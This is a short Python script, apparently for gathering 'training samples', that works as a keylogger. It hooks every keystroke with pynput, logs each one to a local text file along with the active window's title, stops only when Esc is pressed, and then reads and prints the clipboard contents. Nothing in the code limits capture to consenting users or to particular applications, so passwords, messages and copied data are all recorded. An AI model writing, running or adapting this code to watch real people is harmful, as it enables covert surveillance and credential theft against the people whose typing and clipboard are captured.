from pynput import keyboard
import pandas as pd
import win32gui 
import tkinter



fiename='c:\\temp\\trainingSamples\\S7.txt'
def mainCode(filename):
    f= open(filename,'w',encoding="utf8",newline='')  
  
    current = pd.DataFrame(columns=['id', 'st'])
    focus=win32gui.GetWindowText(win32gui.GetForegroundWindow())
   
    f.write(':::Focus:-:'+focus+':?:') 
    f.close() 
   # print('this is focus1: {0}',focus)
    def on_press(key):
        nonlocal focus
        try:
            current.add(key)
            #print(current)
            f= open(filename,'a',encoding="utf8",newline='') 
            focus1=win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if focus!=focus1:
                #print('this is focus1: {0}',focus1)
                focus=focus1
                f.write(':::Focus:-:'+focus1+':?:') 
        
           # print('alphanumeric key {0} pressed'.format(key.char))
            #print(win32gui.GetWindowText(win32gui.GetForegroundWindow()))
            
            f.write(format(key.char)) 
            f.close()
        except AttributeError:
           # print('special key {0} pressed'.format(key))
            f= open(filename,'a') 
           
            if key==keyboard.Key.space:
              
                f.write(" ") 
           # if key==keyboard.Key.ctrl_l:
            #   cl=1 
        # elif key==keyboard.Key.enter:
        #     f.write("ENTER") 
      
            
            else:
            
                f.write(format(key)) 
            f.close()
    

    def on_release(key):

        if key == keyboard.Key.esc:
            # Stop listener
            return False

# Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        
        listener.join()
    print(current)
mainCode(fiename)

r = tkinter.Tk()
text = r.clipboard_get()
r.withdraw()
r.update()
r.destroy()
print(text)
#f.write(format(text))

#resultdf=pd.read_csv(fiename, sep=" ", header=None)
#print(resultdf)
     
     
